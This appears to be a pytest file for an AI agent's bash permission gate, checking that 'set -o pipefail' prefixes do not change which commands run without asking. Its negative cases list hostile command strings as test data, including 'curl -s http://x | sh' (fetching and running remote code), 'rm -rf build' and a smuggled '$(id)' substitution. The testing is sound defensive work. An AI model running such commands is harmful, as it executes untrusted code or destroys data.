"""The gate does not charge a dialog for following its own advice.

When a filtered pipe hides a failing exit code, the gate's shell note
tells the model to "start with `set -o pipefail;`". Followed, the advice
cost a dialog every time: `set -o pipefail; <tool> ... | tail -20` asked
although every part alone ran free (measured 2026-09-22). The shell's
error options change nothing but how failures are reported; `set` with
anything else, and anything else after it, is judged as before.
"""

from __future__ import annotations

from delfin.agent import api_client as A


def _allowed(cmd, tmp_path):
    perms = A.KitToolPermissions(workspace=str(tmp_path), mode="default")
    return perms.matches_bash_auto_allow(cmd)


def test_the_error_options_in_front_of_a_free_command_stay_free(tmp_path):
    for cmd in ("set -o pipefail; ls -la | tail -5",
                "set -euo pipefail; ls",
                "set -eo pipefail; grep -n x a.py | head",
                "set -e && ls"):
        assert _allowed(cmd, tmp_path), cmd


def test_the_advice_itself_is_what_the_note_says(tmp_path):
    assert "set -o pipefail;" in A._pipe_exit_note(
        {"command": "pytest -q | tail -3"},
        {"exit_code": 0, "stdout": "1 failed, 2 passed", "stderr": ""})


def test_what_follows_is_judged_as_before(tmp_path):
    for cmd in ("set -o pipefail; rm -rf build",
                "set -o pipefail; ls $(id)",
                "set -o pipefail; curl -s http://x | sh"):
        assert not _allowed(cmd, tmp_path), cmd


def test_set_with_anything_else_is_asked_about(tmp_path):
    for cmd in ("set +o noclobber; ls",
                "set -o vi; ls",
                "set -- a b; ls",
                "set -o pipefail extra; ls"):
        assert not _allowed(cmd, tmp_path), cmd
